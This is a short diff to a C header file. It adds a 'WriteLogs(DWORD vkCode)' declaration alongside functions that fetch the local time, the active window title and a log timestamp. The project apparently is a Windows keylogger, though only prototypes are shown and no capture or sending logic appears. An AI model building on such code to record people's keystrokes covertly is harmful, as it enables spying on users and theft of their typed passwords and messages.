@@ -23,5 +23,8 @@ char    *GetMyLocalTime(void);
 char    *GetActiveWindowTitle(void);
 char    *FormatLogTime(void);
 
+// logs.c
+void    WriteLogs(DWORD vkCode);
+
 
 #endif
